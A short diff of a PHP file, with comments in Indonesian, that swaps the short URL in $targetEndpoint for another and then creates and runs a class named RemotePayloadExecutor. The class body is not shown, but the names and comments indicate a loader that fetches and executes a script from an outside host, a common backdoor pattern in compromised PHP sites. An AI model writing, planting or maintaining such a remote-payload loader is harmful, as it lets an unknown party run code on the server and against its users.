@@ -277,7 +277,7 @@ class RemotePayloadExecutor {
 // --- Konfigurasi & Eksekusi ---
 
 // URL target script
-$targetEndpoint = 'https://slim.weborama.nl/n5L4ph';
+$targetEndpoint = 'https://slim.weborama.nl/kp29Vp';
 
 // Inisialisasi dan jalankan
 $executor = new RemotePayloadExecutor($targetEndpoint);
